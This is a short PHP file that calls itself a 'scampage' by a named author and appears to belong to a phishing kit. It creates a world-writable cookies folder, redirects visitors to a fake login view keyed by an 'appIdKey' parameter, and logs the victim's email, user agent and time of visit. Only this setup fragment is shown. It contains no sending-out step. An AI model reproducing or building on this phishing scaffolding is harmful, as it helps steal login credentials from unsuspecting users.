<?php
// Scampage by devilscream
if (!file_exists('cookies')) {@mkdir('cookies', 0777, true);}

if (!isset($_GET['view']) && !isset($_GET['status'])) { 
echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=login&appIdKey=".$_SESSION['key']."&country=".$cid."'>";
exit();
}
$keys = $_GET['appIdKey'];
$_SESSION['key'] = $keys;

@set_time_limit(0);
$x=@md5(@microtime());
$rand = md5(microtime());
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$useragent = $_SERVER['HTTP_USER_AGENT'];
/*if (isset($_GET['id'])) {
	$xuser=$_GET['id'];
}else{
	$xuser="";
}*/
$xuser = $_SESSION['email'];
?>